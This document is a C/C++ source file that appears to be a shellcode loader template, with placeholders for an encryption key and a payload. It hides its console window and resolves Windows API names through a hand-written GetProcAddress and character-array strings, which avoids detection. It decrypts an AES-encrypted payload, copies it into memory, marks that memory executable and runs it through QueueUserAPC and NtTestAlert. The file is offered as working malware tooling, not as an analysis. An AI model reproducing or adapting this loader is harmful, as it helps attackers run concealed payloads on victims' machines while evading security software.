#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "ntdll")

// Custom GetProcAddress function
typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);

FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }

    return NULL;
}

typedef BOOL(WINAPI* WriteProcessMemoryPtr)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten
);

unsigned char HvqNFK[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
unsigned char sQKsNqz[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
unsigned char UHVQNq[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };

static NTSTATUS(__stdcall* NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) =
    (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))myGetProcAddress(GetModuleHandle(HvqNFK), sQKsNqz);

static NTSTATUS(__stdcall* ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) =
    (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))myGetProcAddress(GetModuleHandle(HvqNFK), UHVQNq);

static void Random4(float milliseconds) {
    static bool once = true;
    if (once) {
        ULONG actualResolution;
        ZwSetTimerResolution(1, true, &actualResolution);
        once = false;
    }

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(milliseconds * 10000.0f);
    NtDelayExecution(false, &interval);
}

using Random6 = NTSTATUS(NTAPI*)();

unsigned char sNtA[] = { 'N','t','T','e','s','t','A','l','e','r','t', 0x0 };

int DecryptData(char* Random3, unsigned int Random3_len, char* Random2, int Random2len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }

    if (!CryptHashData(hHash, (BYTE*)Random2, (DWORD)Random2len, 0)) {
        return -1;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)Random3, (DWORD*)&Random3_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int main() {
    char Random2[] = KEYVALUE;
    unsigned char Random3[] = PAYVAL;
    unsigned int Random3_len = sizeof(Random3);

    FreeConsole();

    Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA(HvqNFK), (LPCSTR)sNtA));

    SIZE_T Random4 = sizeof(Random3);

    if (DecryptData((char*)Random3, Random3_len, Random2, sizeof(Random2)) != 0) {
        printf("Data decryption failed\n");
        return 1;
    }

    LPVOID Random5 = VirtualAlloc(NULL, Random4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    Sleep(3000); // Corrected Sleep function name

    WriteProcessMemoryPtr pWriteProcessMemory =
reinterpret_cast<WriteProcessMemoryPtr>(myGetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteProcessMemory"));


if (pWriteProcessMemory != nullptr) {
    // Using native API WriteProcessMemory
    if (pWriteProcessMemory(GetCurrentProcess(), Random5, Random3, Random4, nullptr)) {
        
    }
    else {
        
    }
}
else {
   
}

    RtlCopyMemory(Random5, Random3, Random3_len);

    DWORD oldProtect;
    VirtualProtect(Random5, Random3_len, PAGE_EXECUTE_READ, &oldProtect);

    ULONG_PTR additionalData = 0;

    PTHREAD_START_ROUTINE Random8 = (PTHREAD_START_ROUTINE)Random5;

    QueueUserAPC((PAPCFUNC)Random8, GetCurrentThread(), additionalData);

    Random7();

    return 0;
}
